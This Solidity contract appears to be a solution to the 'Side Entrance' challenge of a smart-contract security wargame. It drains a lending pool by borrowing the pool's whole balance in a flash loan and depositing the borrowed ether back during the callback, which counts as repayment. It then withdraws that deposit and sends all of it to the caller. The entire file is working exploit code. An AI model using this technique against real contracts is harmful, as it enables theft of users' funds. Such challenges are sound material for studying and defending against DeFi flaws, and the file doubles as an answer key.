// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolHack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    function hack(address poolAddress) external {
        pool = SideEntranceLenderPool(poolAddress);
        pool.flashLoan(poolAddress.balance);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
